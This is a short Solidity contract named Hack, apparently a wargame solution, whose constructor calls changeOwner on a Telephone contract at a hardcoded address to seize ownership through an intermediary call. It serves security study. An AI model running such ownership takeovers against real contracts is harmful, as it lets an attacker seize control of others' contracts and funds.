// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Telephone} from "./Telephone.sol";
import "forge-std/console.sol";

contract Hack 
{
    constructor() 
    {
        Telephone i = Telephone(0xc72010e732C8CC5Fc5328f908858Ca360bbe6E67);
        i.changeOwner(0x88DFBB3e5AC0D3988C6947B13A71Aef44Ff76B6c);
    }
}